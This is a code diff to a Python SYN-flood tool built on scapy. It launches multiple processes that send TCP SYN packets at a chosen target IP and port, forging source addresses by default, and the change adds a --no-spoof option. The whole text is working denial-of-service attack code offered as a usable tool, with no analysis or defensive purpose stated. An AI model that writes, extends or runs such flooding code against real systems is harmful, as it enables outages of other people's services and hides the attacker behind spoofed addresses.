@@ -1,7 +1,7 @@
 """ ezSYN FLOOD MULTIPROCESS.
 
 Usage:
-  ezSYN_FLOOD_MULTIPROCESS.py <dst_ip> <dst_port> [--workers=<amount>] [--sleep=<seconds>]
+  ezSYN_FLOOD_MULTIPROCESS.py <dst_ip> <dst_port> [--no-spoof] [--workers=<amount>] [--sleep=<seconds>]
 
 Options:
   -h, --help            Show options.
@@ -25,13 +25,14 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
 
-def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int):
+def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int, spoof_ip=True):
     # the actual code that will be sending SYN packets
     for src_host in range(1, 254):
         for src_port in range(1024, 65535):
             # Build the packet
             src_ip = "{src_net}.{src_host}".format(src_net=src_net, src_host=src_host)
-            network_layer = IP(src=src_ip, dst=dst_ip)
+            network_layer = IP(src=src_ip, dst=dst_ip) if spoof_ip else \
+                    IP(dst=dst_ip)
             transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")
 
             # Send the packet
@@ -55,6 +56,7 @@ def main(arguments):
     dst_port = int(arguments["<dst_port>"])
     workers = int(arguments["--workers"])
     sleep = int(arguments["--sleep"])
+    spoof = not arguments["--no-spoof"]
 
     signal.signal(signal.SIGINT, signal_handler)
 
@@ -69,7 +71,7 @@ def main(arguments):
     processes = []
     for worker in range(1, workers+1):
         src_net = "15.15.{worker}".format(worker=worker)
-        p = Process(target=flood, args=(src_net, dst_ip, dst_port, sleep), daemon=True)
+        p = Process(target=flood, args=(src_net, dst_ip, dst_port, sleep, spoof), daemon=True)
         processes.append(p)
         p.start()
 
